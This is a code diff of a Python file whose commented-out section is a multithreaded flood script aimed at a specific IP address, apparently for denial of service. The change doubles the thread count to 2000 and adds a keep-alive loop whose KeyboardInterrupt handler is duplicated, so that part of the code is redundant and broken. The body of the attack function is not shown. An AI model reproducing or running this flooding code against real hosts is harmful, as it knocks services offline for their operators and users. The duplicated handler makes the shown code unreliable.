@@ -2,7 +2,7 @@
 # import threading
 
 # target = "http://64.23.233.33"
-# num_threads = 1000
+# num_threads = 2000
 
 # def attack():
 #     while True:
@@ -16,6 +16,13 @@
 #     t = threading.Thread(target=attack)
 #     t.daemon = True
 #     t.start()
+# try:
+#     while True:
+#         pass
+# except KeyboardInterrupt:
+#     print("Stopping all threads...")
+# except KeyboardInterrupt:
+#     print("Stopping all threads...")
 
 # input("Press Enter to stop...\n")
 import os
